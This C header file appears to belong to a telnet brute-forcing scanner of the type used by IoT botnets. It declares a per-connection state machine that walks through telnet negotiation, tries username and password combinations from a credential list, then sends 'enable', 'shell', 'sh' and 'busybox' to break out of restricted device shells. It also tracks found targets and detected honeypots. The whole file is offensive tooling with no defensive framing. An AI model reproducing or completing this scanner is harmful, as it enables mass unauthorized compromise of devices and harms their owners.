#pragma once

#include <stdint.h>
#include <pthread.h>
#include "combos.h"

#define TIMEOUT 30
#define MAX_CONS 99999
#define ACTUAL_MAX_CONS 30000
#define RDBUF_SIZE 8192

#define ATOMIC_ADD(ptr,i) __sync_fetch_and_add((ptr),i)
#define ATOMIC_SUB(ptr,i) __sync_fetch_and_sub((ptr),i)
#define ATOMIC_INC(ptr) ATOMIC_ADD((ptr),1)
#define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr),1)
#define ATOMIC_GET(ptr) ATOMIC_ADD((ptr),0)

int epfd;
uint16_t tport;
pthread_mutex_t mutex;
extern volatile int processed, failed, processing, found, honeypots, maxfds, last_found, left_in_queue;

typedef struct 
{
    enum
    {
        BR_IACS,
        BR_USERNAME,
        BR_PASSWORD,
        BR_SEND_ENABLE,
        BR_SEND_LSHELL,
        BR_SEND_SYSTEM,
        BR_SEND_SH,
        BR_SEND_BUSYBOX,
        BR_WAITING_TOKEN_RESP
    } stage;

    Combo *auth;

    int fd, rdbuf_pos, last_recv;
    char rdbuf[RDBUF_SIZE], address[16];
    uint8_t tries;
} Brute;

Brute *bruter;

void control_epoll(int, int, uint32_t);
